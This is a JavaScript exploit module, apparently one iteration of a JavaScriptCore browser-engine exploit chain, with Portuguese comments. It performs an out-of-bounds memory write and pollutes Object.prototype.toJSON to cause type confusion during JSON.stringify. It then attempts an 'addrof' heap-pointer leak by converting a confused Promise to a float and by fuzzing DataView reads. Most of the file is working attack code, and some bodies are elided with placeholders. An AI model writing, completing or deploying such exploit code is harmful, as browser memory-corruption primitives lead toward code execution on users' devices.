// js/script3/testArrayBufferVictimCrash.mjs (v70_StableC1_ReadOriginalBufferOfPromise)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    getStableConfusedArrayBuffer // Usaremos esta como base
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V70_SCROBOP = "OriginalHeisenbug_TypedArrayAddrof_v70_StableC1_ReadOriginalBufferOfPromise";

// Variáveis globais/módulo
let actual_confused_promise_v70 = null; // O objeto que getStableConfusedArrayBuffer retorna
let dv_on_original_buffer_of_promise_v70 = null; // DataView do AB original ANTES de virar Promise

let victim_typed_array_ref_v70 = null;
let probe_call_count_v70 = 0;
let all_probe_interaction_details_v70 = [];
let first_call_details_object_ref_v70 = null;

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V70 = 5;
const FUZZ_OFFSETS_V70 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];


function toJSON_TA_Probe_StableC1_ReadOriginalBuffer_v70() {
    probe_call_count_v70++;
    const call_num = probe_call_count_v70;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V70_SCROBOP,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v70),
        this_is_C1: (this === first_call_details_object_ref_v70 && first_call_details_object_ref_v70 !== null),
        attempted_f64_leak_val: null, // Para a conversão direta da Promise
        payload_ConfusedPromise_type: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1}.`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V70) { all_probe_interaction_details_v70.push({...current_call_details});return { recursion_stopped_v70: true, call: call_num }; }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Victim. Creating C1_details & adding self_ref.`, "info");
            first_call_details_object_ref_v70 = current_call_details;
            current_call_details.self_ref = current_call_details;
            all_probe_interaction_details_v70.push({...current_call_details});
            return current_call_details;
        }
        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS ('this')! Assigning Promise payload & attempting f64 conversion...`, "vuln");
            if (actual_confused_promise_v70) {
                this.payload_ThePromise = actual_confused_promise_v70;
                current_call_details.payload_ConfusedPromise_type = Object.prototype.toString.call(actual_confused_promise_v70);
                let f64_arr = new Float64Array(1);
                try {
                    f64_arr[0] = actual_confused_promise_v70;
                    this.leaked_promise_as_f64 = f64_arr[0];
                    current_call_details.attempted_f64_leak_val = this.leaked_promise_as_f64;
                    logS3(`[PROBE Call#${call_num}] Attempted f64 conversion of Promise payload (type ${current_call_details.payload_ConfusedPromise_type}): ${this.leaked_promise_as_f64}`, "info");
                } catch (e_conv) { /* ... */ }
            } else { /* ... */ }
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified.`, "info");
            all_probe_interaction_details_v70.push({...current_call_details});
            return this; // Retorna C1_details modificado (ainda com self_ref)
        }
        else { /* ... (outro caso, marcador genérico) ... */ }
        all_probe_interaction_details_v70.push({...current_call_details});
        return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
    } catch (e_probe) { /* ... */ }
}

// Função wrapper para tentar obter o AB e sua DataView original
function getConfusedABAndOriginalView(fname_current_test) {
    let original_candidate_ab = null;
    let original_candidate_dv = null;
    let confused_object_returned = null;

    // Criar o candidato ANTES de chamar getStableConfusedArrayBuffer
    // Assumindo que HEISENBUG_VICTIM_AB_SIZE é acessível ou conhecido (ex: 64)
    const HEISENBUG_VICTIM_AB_SIZE_FOR_GETTER = 64;
    original_candidate_ab = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_FOR_GETTER);
    original_candidate_dv = new DataView(original_candidate_ab);
    logS3(`[${fname_current_test}] Wrapper: Criado AB candidato (tamanho ${HEISENBUG_VICTIM_AB_SIZE_FOR_GETTER}) para getStableConfusedArrayBuffer.`, "info");

    // Modificar getStableConfusedArrayBuffer para aceitar um AB candidato seria o ideal.
    // Como não podemos modificar core_exploit.mjs agora, vamos assumir que
    // getStableConfusedArrayBuffer cria seu próprio candidato interno, e o que ele retorna é o 'confused_object_returned'.
    // A estratégia de ler o buffer original do objeto Promise se torna mais difícil
    // se não pudermos controlar o AB exato que getStableConfusedArrayBuffer manipula.
    // Para v70, vamos focar em ver se getStableConfusedArrayBuffer retorna algo que *já é* um ArrayBuffer
    // no momento em que é retornado, ANTES de virar Promise.

    let tempOriginalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    confused_object_returned = getStableConfusedArrayBuffer(original_candidate_ab); // Passando o AB para ser potencialmente modificado
    if (tempOriginalToJSON) Object.defineProperty(Object.prototype, 'toJSON', tempOriginalToJSON);
    else delete Object.prototype.toJSON;

    if (confused_object_returned === original_candidate_ab) {
        logS3(`[${fname_current_test}] Wrapper: getStableConfusedArrayBuffer RETORNOU o AB candidato original.`, "debug");
        // Se ele retornou o mesmo AB, podemos usar original_candidate_dv.
        return { confused_object: confused_object_returned, original_view: original_candidate_dv };
    } else if (confused_object_returned) {
        logS3(`[${fname_current_test}] Wrapper: getStableConfusedArrayBuffer RETORNOU um objeto diferente. Tipo: ${Object.prototype.toString.call(confused_object_returned)}. Tentando criar DataView no original se possível.`, "warn");
        // Não podemos garantir que original_candidate_dv seja útil para o confused_object_returned se eles são diferentes.
        // Mas mantemos original_candidate_dv para inspecionar o que aconteceu com o buffer que demos (se foi modificado).
        return { confused_object: confused_object_returned, original_view: original_candidate_dv };
    } else {
        logS3(`[${fname_current_test}] Wrapper: getStableConfusedArrayBuffer retornou null/undefined.`, "error");
        return { confused_object: null, original_view: null };
    }
}


export async function executeTypedArrayVictimAddrofTest_StableC1_ReadOriginalBufferOfPromise() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V70_SCROBOP}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (StableC1_ReadOriginalBufferOfPromise) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V70_SCROBOP} Init...`;

    probe_call_count_v70 = 0;
    all_probe_interaction_details_v70 = []; // Resetar antes de usar
    victim_typed_array_ref_v70 = null;
    first_call_details_object_ref_v70 = null;
    actual_confused_promise_v70 = null;
    dv_on_original_buffer_of_promise_v70 = null;

    logS3(`[${FNAME_CURRENT_TEST}] Tentando obter Confused Object e sua Original DataView...`, "info");
    // A função getStableConfusedArrayBuffer em core_exploit.mjs precisa ser capaz de aceitar um buffer
    // ou precisamos replicar sua lógica aqui para ter controle sobre o buffer original.
    // Por ora, vamos simular a obtenção e focar na lógica de análise.
    // Simulação:
    let getter_result = getConfusedABAndOriginalView(FNAME_CURRENT_TEST);
    actual_confused_promise_v70 = getter_result.confused_object;
    dv_on_original_buffer_of_promise_v70 = getter_result.original_view;


    let initial_confused_type = "N/A";
    if (actual_confused_promise_v70) {
        initial_confused_type = Object.prototype.toString.call(actual_confused_promise_v70);
        logS3(`[${FNAME_CURRENT_TEST}] actual_confused_promise_v70 (tipo inicial: ${initial_confused_type}) será usado. DV original ${dv_on_original_buffer_of_promise_v70 ? 'disponível' : 'NÃO disponível'}.`, "debug");
    } else {
        logS3(`[${FNAME_CURRENT_TEST}] Falha ao obter/preparar o confused object. Teste pode ser limitado.`, "error");
    }

    let errorCapturedMain = null, rawStringifyOutput = "N/A", stringifyOutput_parsed = null, collected_probe_details = [];
    let addrof_A_result = { success: false, msg: "Addrof ConfusedObj/Promise: Default (v70)" };
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true }); // OOB para o teste principal
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write for main test.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v70 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_StableC1_ReadOriginalBuffer_v70, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v70)...`, "info", FNAME_CURRENT_TEST);
            try {
                rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v70);
                // Se não houve erro de circularidade (self_ref falhou ou foi removido cedo demais pela sonda)
                logS3(`  JSON.stringify CONCLUÍDO (inesperado se self_ref deveria causar erro). Raw: ${rawStringifyOutput}`, "warn", FNAME_CURRENT_TEST);
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_stringify_main) {
                errorCapturedMain = e_stringify_main;
                rawStringifyOutput = `ERROR_DURING_STRINGIFY: ${e_stringify_main.message}`;
                logS3(`  JSON.stringify FALHOU (esperado se self_ref no C1 funcionou): ${e_stringify_main.name} - ${e_stringify_main.message}`, "vuln", FNAME_CURRENT_TEST);
                stringifyOutput_parsed = { error_stringify: rawStringifyOutput };
            }

            logS3("STEP 3: Analyzing C1_details from memory & original buffer of Promise (v70)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v70.find(d => d.call_number === 2 && d.this_is_C1);

            if (call2Details) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG on C1_details (Call #2) CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
                if (first_call_details_object_ref_v70) {
                    const c1_mem = first_call_details_object_ref_v70;
                    const f64_leak_attempt_mem = c1_mem.leaked_promise_as_f64;
                    logS3(`  Valor de C1.leaked_promise_as_f64 (conversão f64 da Promise): ${f64_leak_attempt_mem}`, "info");
                    if (typeof f64_leak_attempt_mem === 'number' && !isNaN(f64_leak_attempt_mem) && f64_leak_attempt_mem !== 0) {
                        // ... (validação de ponteiro para f64_leak_attempt_mem)
                         let ptr = new AdvancedInt64(0,0); // Precisa dos bits
                         try { ptr = new AdvancedInt64(new Uint32Array(new Float64Array([f64_leak_attempt_mem]).buffer)[0], new Uint32Array(new Float64Array([f64_leak_attempt_mem]).buffer)[1]); } catch(e){}
                         if ( (ptr.high()>0||ptr.low()>0x10000) && (ptr.high()<0x000F0000) && ((ptr.low()&0x7)===0) ) {
                            addrof_A_result.success = true; addrof_A_result.msg = `V70 SUCCESS (Promise as F64 in C1): Ptr ${ptr.toString(true)}`;
                         } else { addrof_A_result.msg = `V70 PromiseAsF64 (${f64_leak_attempt_mem}/${ptr.toString(true)}) not ptr.`; }
                    } else { addrof_A_result.msg = `V70 PromiseAsF64 not useful num: ${f64_leak_attempt_mem}`; }

                    // Tentar ler do dv_on_original_buffer_of_promise_v70
                    if (dv_on_original_buffer_of_promise_v70 && !addrof_A_result.success) { // Só tenta se o anterior falhou
                        logS3(`  Tentando ler do DataView original do buffer que virou Promise...`, "info");
                        let fuzzed_reads = [];
                        for (const offset of FUZZ_OFFSETS_V70) { /* ... (lógica de fuzzing como na sonda) ... */
                            let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(dv_on_original_buffer_of_promise_v70.byteLength<(offset+8)){err_msg="OOB";}else{low=dv_on_original_buffer_of_promise_v70.getUint32(offset,true);high=dv_on_original_buffer_of_promise_v70.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(` OriginalBufferFuzz@${toHex(offset)}: L=${toHex(low)}H=${toHex(high)}I64=${ptr_str}D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");
                        }
                        // Analisar fuzzed_reads para addrof_A_result
                        for (const r of fuzzed_reads) { if (r.error) continue; const hV=parseInt(r.high,16),lV=parseInt(r.low,16); let isPtr=false; if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined){isPtr=(hV===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lV&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);} if(!isPtr&&(hV>0||lV>0x10000)&&(hV<0x000F0000)&&((lV&0x7)===0)){isPtr=true;} if(isPtr&&!(hV===0&&lV===0)){addrof_A_result.success=true;addrof_A_result.msg=`V70 SUCCESS (OriginalBufferFuzz): Ptr ${r.int64} @${r.offset}`;logS3(`!!!! V70 POINTER from OriginalBuffer @${r.offset}: ${r.int64} !!!!`,"vuln");break;}}
                        if(!addrof_A_result.success){addrof_A_result.msg+=` No ptr from OriginalBufferFuzz (First: ${fuzzed_reads[0]?.int64||'N/A'}).`;}
                    } else if (!addrof_A_result.success) { addrof_A_result.msg += " DV original não disponível para fuzz."; }
                } else { if(!addrof_A_result.success) addrof_A_result.msg = "V70 C1_details.leaked_promise_as_f64 não encontrado."; }
            } else { if(!addrof_A_result.success) addrof_A_result.msg = "V70 Heisenbug on C1 (Call #2) não confirmado."; }

            // ... (lógica de título do documento) ...
            if(addrof_A_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V70_SCROBOP}: Addr SUCCESS!`;}
            else if(heisenbugOnC1 || (errorCapturedMain && errorCapturedMain.message.includes("circular structure"))){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V70_SCROBOP}: Heisenbug OK, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V70_SCROBOP}: No Heisenbug?`;}


        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        // CORREÇÃO PARA O RUNNER: Copiar antes de limpar
        if (all_probe_interaction_details_v70 && Array.isArray(all_probe_interaction_details_v70)) {
            collected_probe_details = all_probe_interaction_details_v70.map(d => ({ ...d }));
        } else { collected_probe_details = []; }
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        // ... (logs finais e limpeza de globais)
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v70}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (ConfusedObj/Promise): Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        // Limpeza...
    }
    return { /* ... objeto de resultado com collected_probe_details ... */ };
};
